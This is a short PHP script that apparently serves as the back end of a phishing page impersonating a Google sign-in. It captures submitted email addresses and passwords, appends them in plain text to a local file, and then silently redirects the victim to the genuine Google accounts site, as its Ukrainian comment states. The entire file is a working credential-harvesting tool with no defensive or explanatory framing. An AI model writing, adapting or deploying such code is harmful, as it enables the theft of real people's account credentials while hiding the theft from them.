<?php
$email = $_POST['email'];
$password = $_POST['password'];

file_put_contents('logins.txt', "Email: $email | Password: $password\n", FILE_APPEND);

header('Location: https://accounts.google.com'); // перенаправлення на справжній сайт після введення
exit;
